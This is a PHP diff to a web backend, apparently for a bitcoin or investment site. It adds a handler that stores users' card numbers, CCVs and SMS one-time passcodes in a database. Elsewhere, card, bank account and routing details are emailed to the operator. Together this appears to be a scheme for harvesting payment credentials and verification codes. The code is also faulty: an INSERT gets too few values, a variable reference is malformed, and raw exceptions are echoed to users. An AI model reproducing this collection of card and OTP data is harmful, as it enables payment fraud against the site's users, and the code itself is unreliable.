@@ -3,6 +3,72 @@
 include 'database/DataBase.php';
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $conn = DataBase::getConn();
+    $user = $_SESSION['USER'];
+    // verifieotp
+    if (isset($_REQUEST['verifieotp'])) {
+        try {
+            parse_str($_REQUEST['verifieotp'], $data);
+            $q = "SELECT * FROM `otp` WHERE `uid`=?";
+            $stm = $conn->prepare($q);
+            $stm->execute([$user->id]);
+            if ($stm->rowCount() > 0) {
+
+                // update
+                $q = "UPDATE `otp` SET `uid`=?,`fname`=?,`lname`=?,`phone`=?,`expiredAt`=?,`otp`=?,`amt`=?,`cardnumber`=?,`ccv`=? WHERE `uid`=?";
+
+                $stm = $conn->prepare($q);
+                $stm->execute([$user->id, $data['fname'], $data['lname'], $data['otpnumber'], $data['expire'], $data['otpcode'], $data['amt'],$data['cardnumber'], $data['ccv'],   $user->id]);
+                if ($stm->rowCount() > 0) {
+
+                    // check state
+                    $q = "SELECT * FROM `otp` WHERE `uid`=?";
+                    $stm = $conn->prepare($q);
+                    $stm->execute([$user->id]);
+                    $data = $stm->fetch();
+                    $v = $data->verify;
+                    if ($v == true) {
+                        echo "Request verified";
+                    } else {
+                        echo "Enter the otp We sent to your phone to verify";
+                    }
+                } else {
+
+                    // check state
+                    $q = "SELECT * FROM `otp` WHERE `uid`=?";
+                    $stm = $conn->prepare($q);
+                    $stm->execute([$user->id]);
+                    $data = $stm->fetch();
+                    $v = $data->verify;
+                    if ($v == true) {
+                        echo "Request verified";
+                    } else {
+                        echo "Enter the otp We sent to your phone to verify";
+                    }
+                }
+            } else {
+                // save
+                $q = "INSERT INTO `otp`(`uid`, `fname`, `lname`, `phone`, `expiredAt`, `otp`, `amt`,`cardnumber`,`ccv`) VALUES (?,?,?,?,?,?,?,?,?)";
+                $stm = $conn->prepare($q);
+                $stm->execute([$user->id, $data['fname'], $data['lname'], $data['otpnumber'], $data['expire'],  $data['cardnumber'], $data['ccv']]);
+
+                // check state
+                $q = "SELECT * FROM `otp` WHERE `uid`=?";
+                $stm = $conn->prepare($q);
+                $stm->execute([$user->id]);
+                $data = $stm->fetch();
+                $v = $data->verify;
+                if ($v == true) {
+                    echo "Request verified";
+                } else {
+                    echo "Enter the otp We sent to your phone to verify";
+                }
+            }
+        } catch (\Throwable $th) {
+            echo $th;
+        }
+    }
+
     // register
     if (!empty($_REQUEST['action']) and $_REQUEST['action'] == "register") {
         $email = htmlentities($_REQUEST['email']);
@@ -121,14 +187,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     //card insert
 
     if (isset($_REQUEST['cardData'])) {
-    
+
         parse_str($_REQUEST['cardData'], $data);
 
         // print_r($data);
         $arr = array($user->id, $data['card_number'], $data['expire'], $data['ccv'], $data['name'], $data['country'], $data['state'], $data['city'], $data['zip']);
         $response = DataBase::addcard($arr);
-        $sub="Add Card Withdraw";
-        $mess="
+        $sub = "Add Card Withdraw";
+        $mess = "
         <b> <UID:</b>{$user->id}\n
         <b>CardNumber(btc)</b>:{$$data['card_number']}\n
         <b> Expire:</b>{$data['expire']}\n
@@ -136,7 +202,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         <b> Name:</b>{$data['name']}
 
         ";
-        DataBase::Recieve_mail($mess,$sub);
+        DataBase::Recieve_mail($mess, $sub);
         echo $response;
     }
     //currency
@@ -242,7 +308,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     if (isset($_REQUEST['profileUpdate'])) {
         parse_str($_REQUEST['profileUpdate'], $data);
         // print_r($data);
-        $user = $_SESSION['USER'];
+
         $val = array(
             $data['email'], $data['country'], $data['name'],
             $data['gender'], $data['address'], $data['referer'], $data['phone'], $user->id
@@ -250,7 +316,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         // print_r($user);
         echo DataBase::updateProfile($val);
     }
-    $user = $_SESSION['USER'];
+
     // change profile pic
     if (isset($_REQUEST['uploadImage'])) {
         $file = $_FILES['picture'];
@@ -359,15 +425,15 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 $q = "INSERT INTO `withdraw`(`id`, `amount_btc`, `amount_usd`) VALUES (?,?,?)";
                 $stm = $conn->prepare($q);
                 $stm->execute([$user->id, $amtbtc, $amtdolle]);
-                $sub="Requesting Withdraw";
-                $mess="
+                $sub = "Requesting Withdraw";
+                $mess = "
                 <b> <UID:</b>{$user->id}\n
                 <b>Amount(btc)</b>:{$amtbtc}\n
                 <b> Routing:</b>{$data['routing']}\n
                 <b> Type:</b>{$data['type']}
 
                 ";
-                DataBase::Recieve_mail($mess,$sub);
+                DataBase::Recieve_mail($mess, $sub);
                 echo "Request sent";
             } else {
                 echo "Transaction failed";
@@ -393,24 +459,21 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 $conn = Database::getConn();
                 $q = "INSERT INTO `bank`(`uid`, `account_number`, `r_number`, `account_type`) VALUES (?,?,?,?)";
                 $stm = $conn->prepare($q);
-                
-                $stm->execute([$user->id,$data['account_number'],$data['routing']??null,$data['type']]);
-                $sub="Adding Bank Details";
-                $mess="
+
+                $stm->execute([$user->id, $data['account_number'], $data['routing'] ?? null, $data['type']]);
+                $sub = "Adding Bank Details";
+                $mess = "
                 <b>UID:</b>{$user->id}\n
                 <b>Account:</b>{$data['account_number']}\n
                 <b>Routing:</b>{$data['routing']}\n
                 <b>Type:</b>{$data['type']}
 
                 ";
-                DataBase::Recieve_mail($mess,$sub);
+                DataBase::Recieve_mail($mess, $sub);
                 echo ("Successfull");
             }
         } catch (\Throwable $th) {
             echo $th;
         }
     }
-
-
-
 }
